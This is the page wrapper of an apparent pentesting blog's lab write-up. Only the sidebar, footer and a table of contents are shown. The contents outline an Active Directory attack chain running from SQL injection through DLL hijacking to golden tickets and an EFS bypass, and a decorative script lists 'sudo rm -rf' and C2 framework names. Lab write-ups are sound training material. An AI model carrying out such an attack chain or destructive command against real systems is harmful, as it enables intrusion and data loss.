class="relatedPosts-list"><div><a href="/2024/08/26/tea/" title="Tea - Vulnlab"><img class="cover" src="/images/vulnlab/tea-vl/tea_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-26</div><div class="title">Tea - Vulnlab</div></div></a></div><div><a href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img class="cover" src="/images/vulnlab/delegate-vl/delegate_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Delegate - Vulnlab</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/cyber.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youssef Achtatal</div><div class="author-info__description">Pentesting & Windows security research</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/regex-33" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/youssef-achtatal-5642a52b1/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.instagram.com/regex-33/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from Vulnlab & HTB, along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-SQLi"><span class="toc-text">PHP SQLi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLi-PHP-Filter-Bypass"><span class="toc-text">SQLi PHP Filter Bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-Enumeration"><span class="toc-text">MySQL Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dumping-LDAP"><span class="toc-text">Dumping LDAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ForceChangePassword-Object-Control"><span class="toc-text">ForceChangePassword Object Control</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC1-Host-Reconnaissance"><span class="toc-text">DC1 Host Reconnaissance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ProcMon-Executable-Reverse-Engineering"><span class="toc-text">ProcMon Executable Reverse Engineering</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DLL-Hijacking"><span class="toc-text">DLL Hijacking</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Trust-Enumeration"><span class="toc-text">Domain Trust Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Golden-Ticket-to-DC2"><span class="toc-text">Golden Ticket to DC2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EFS-Bypass-as-SYSTEM"><span class="toc-text">EFS Bypass as SYSTEM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/tea/" title="Tea - Vulnlab"><img src="/images/vulnlab/tea-vl/tea_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tea - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/26/tea/" title="Tea - Vulnlab">Tea - Vulnlab</a><time datetime="2024-08-26T15:48:36.000Z" title="Created 2024-08-26 11:48:36">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img src="/images/vulnlab/delegate-vl/delegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Delegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/30/delegate/" title="Delegate - Vulnlab">Delegate - Vulnlab</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/05/domain-trusts/" title="Domain &amp; Forest Trusts"><img src="/images/research/domain-trusts/domain_trusts.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Domain &amp; Forest Trusts"/></a><div class="content"><a class="title" href="/2024/06/05/domain-trusts/" title="Domain &amp; Forest Trusts">Domain &amp; Forest Trusts</a><time datetime="2024-06-06T02:35:44.000Z" title="Created 2024-06-05 22:35:44">2024-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/05/trusted/" title="Trusted - Vulnlab"><img src="/images/vulnlab/trusted-vl/trusted_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trusted - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/05/trusted/" title="Trusted - Vulnlab">Trusted - Vulnlab</a><time datetime="2024-06-05T19:20:37.000Z" title="Created 2024-06-05 15:20:37">2024-06-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youssef Achtatal</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">website</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>